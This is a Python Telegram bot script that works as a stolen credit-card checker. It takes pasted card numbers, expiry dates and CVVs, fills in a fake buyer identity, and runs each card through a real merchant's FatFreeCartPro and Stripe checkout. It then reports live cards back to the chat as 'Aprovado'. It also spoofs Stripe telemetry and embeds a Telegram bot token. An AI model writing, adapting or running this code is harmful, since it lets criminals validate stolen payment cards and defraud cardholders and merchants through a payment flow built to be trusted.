import requests
import json
import time
import re
import uuid
import random
import telebot
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib.parse import urlparse, parse_qs

# ==============================================================================
#  FATFREECARTPRO + STRIPE — RAILWAY WORKER BOT
# ==============================================================================

TELEGRAM_BOT_TOKEN = '8806372148:AAG5KvpIAcO97IM-A00DfznguWu5eQ5qGp0'
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

def get_robust_session():
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def generate_full_identity():
    first_names = ["Guilherme", "Rodrigo", "Felipe", "Lucas", "Gabriel", "Mateus", "Bruno", "Tiago", "Rafael", "Leonardo"]
    last_names  = ["Souza", "Silva", "Santos", "Oliveira", "Pereira", "Lima", "Costa", "Ferreira", "Rodrigues", "Almeida"]
    domains     = ["gmail.com", "outlook.com", "hotmail.com", "yahoo.com", "icloud.com"]
    addresses = [{"street": "1050 S Flower St", "city": "Los Angeles", "state": "CA", "zip": "90015"}, {"street": "233 S Wacker Dr", "city": "Chicago", "state": "IL", "zip": "60606"}, {"street": "1097 Howard St", "city": "San Francisco", "state": "CA", "zip": "94103"}, {"street": "1720 2nd Ave", "city": "New York", "state": "NY", "zip": "10128"}, {"street": "2101 4th Ave", "city": "Seattle", "state": "WA", "zip": "98121"}]
    first, last = random.choice(first_names), random.choice(last_names)
    addr = random.choice(addresses)
    return {"first_name": first, "last_name": last, "full_name": f"{first} {last}", "email": f"{first.lower()}.{last.lower()}{random.randint(100, 9999)}@{random.choice(domains)}", "phone": f"+1{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}", "address": addr["street"], "city": addr["city"], "state": addr["state"], "zip": addr["zip"], "country": "US"}

APPROVED_INDICATORS = ["Your card\'s security code is incorrect.", "incorrect_cvc", "AuthorizeResult", "Approved", "Transaction Authorized", "succeeded", "authorized", "requires_capture", "processing", "pass", "insufficient_funds"]

def is_approved_response(response_text):
    for indicator in APPROVED_INDICATORS:
        if indicator.lower() in response_text.lower(): return True
    return False

def extract_ids_from_url(url):
    try:
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        return query_params.get("cl", [None])[0], query_params.get("i", [None])[0]
    except: return None, None

def process_payment(card_data, target_url, chat_id):
    client_id, item_id = extract_ids_from_url(target_url)
    if not client_id: return

    identity = generate_full_identity()
    try:
        cc_num, cc_month, cc_year, cc_cvv = card_data.strip().split("|")
        if len(cc_year) == 2: cc_year = "20" + cc_year
    except:
        bot.send_message(chat_id, f"❌ Formato inválido: {card_data}")
        return

    session = get_robust_session()
    ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"

    try:
        # 1. Inicializar
        init_url = f"https://www.fatfreecartpro.com/ecom/gbv3.php?c=cart&ejc=2&cl={client_id}&i={item_id}&add=1&initialize=1"
        resp_init = session.get(init_url, headers={'user-agent': ua}, timeout=20)
        
        cart_id = re.search(r'cart_id=(\d+)', resp_init.url) or re.search(r'cart_id["\"]?\s*[:=]\s*["\"]?(\d+)', resp_init.text)
        cart_md5 = re.search(r'cart_md5=([a-f0-9]{32})', resp_init.url) or re.search(r'cart_md5["\"]?\s*[:=]\s*["\"]?([a-f0-9]{32})', resp_init.text)
        
        if not cart_id:
            cart_id, cart_md5 = session.cookies.get('ej_cart_id'), session.cookies.get('ej_cart_md5')
        else:
            cart_id, cart_md5 = cart_id.group(1), cart_md5.group(1)

        if not cart_id: return

        referer_url = f"https://www.fatfreecartpro.com/ecom/ccv3/?client_id={client_id}&cart_id={cart_id}&cart_md5={cart_md5}&initialize"

        # 2. Stripe Keys & Telemetry
        resp_stripe_init = session.get(f"https://www.fatfreecartpro.com/ecom/ccv3/assets-php/Stripe/stripe_initialize.php?client_id={client_id}&cart_id={cart_id}&cart_md5={cart_md5}", headers={'user-agent': ua}, timeout=15)
        stripe_pk = (re.search(r'pk_live_[a-zA-Z0-9]+', resp_stripe_init.text) or re.search(r'pk_live_[a-zA-Z0-9]+', session.get(referer_url, headers={'user-agent': ua}).text)).group(0)
        stripe_acc = re.search(r'acct_[a-zA-Z0-9]+', resp_stripe_init.text).group(0) if "acct_" in resp_stripe_init.text else "acct_1NMRCgJG5BoI6HHT"

        muid, sid = str(uuid.uuid4()), str(uuid.uuid4())
        session.post('https://m.stripe.com/6', headers={'user-agent': ua}, data={'muid': muid, 'sid': sid, 'url': referer_url}, timeout=10)

        # 3. Atividade
        data_act = f"&cart_id={cart_id}&same_s_b=0&b_email={identity['email']}&b_name={identity['full_name']}&b_address1={identity['address']}&b_city={identity['city']}&b_country=US&b_state={identity['state']}&b_postcode={identity['zip']}&b_phone={identity['phone']}&payment_initiated=false&save_activity=1"
        session.post('https://www.fatfreecartpro.com/ecom/cc_activity.php', headers={'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'referer': referer_url}, data=data_act, timeout=15)

        # 4. Stripe Payment Method
        headers_stripe = {'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': ua}
        data_stripe = {'type': 'card', 'card[number]': cc_num, 'card[cvc]': cc_cvv, 'card[exp_month]': cc_month, 'card[exp_year]': cc_year[2:], 'guid': str(uuid.uuid4()), 'muid': muid, 'sid': sid, 'payment_user_agent': 'stripe.js/dff4dfe338; stripe-js-v3/dff4dfe338; card-element', 'key': stripe_pk, '_stripe_account': stripe_acc}
        
        resp_stripe = session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe, timeout=20)
        if resp_stripe.status_code != 200:
            del data_stripe['type']
            resp_stripe = session.post('https://api.stripe.com/v1/tokens', headers=headers_stripe, data=data_stripe, timeout=20)

        if resp_stripe.status_code != 200:
            bot.send_message(chat_id, f"❌ Erro Stripe ➔ {card_data.strip()} ➔ {resp_stripe.json().get('error', {}).get('message')}")
            return
            
        # 5. Finalizar
        payload_val = {"payment_method_id": resp_stripe.json().get('id'), "cart_id": cart_id, "cart_md5": cart_md5, "first_name": identity['first_name'], "last_name": identity['last_name'], "email": identity['email']}
        resp_val = session.post('https://www.fatfreecartpro.com/ecom/ccv3/assets-php/Stripe/stripeValidate.php', headers={'content-type': 'application/json', 'user-agent': ua, 'referer': referer_url}, json=payload_val, timeout=30)
        
        resp_text = resp_val.text
        site_msg = resp_val.json().get('message') if resp_val.status_code == 200 else resp_text

        if is_approved_response(resp_text):
            bot.send_message(chat_id, f"✅ Aprovado ➔ {cc_num}|{cc_month}|{cc_year}|{cc_cvv} ➔ {site_msg}")
        else:
            bot.send_message(chat_id, f"❌ Reprovado ➔ {cc_num}|{cc_month}|{cc_year}|{cc_cvv} ➔ {site_msg}")

    except Exception as e:
        bot.send_message(chat_id, f"⚠️ Erro: {str(e)}")

LISTA_PRODUTOS = ["https://www.fatfreecartpro.com/ecom/gbv3.php?c=cart&ejc=2&cl=373253&i=1781166"]

@bot.message_handler(commands=['start'])
def start(message): bot.reply_to(message, "🤖 Bot Railway Ativo!")

@bot.message_handler(func=lambda message: True)
def handle(message):
    cards = message.text.strip().split('\n')
    bot.send_message(message.chat.id, f"⏳ Processando {len(cards)} cartões...")
    for index, card in enumerate(cards):
        if card.strip():
            process_payment(card, LISTA_PRODUTOS[index % len(LISTA_PRODUTOS)], message.chat.id)
            time.sleep(5)
    bot.send_message(message.chat.id, "🏁 Fim.")

if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception:
            time.sleep(5)
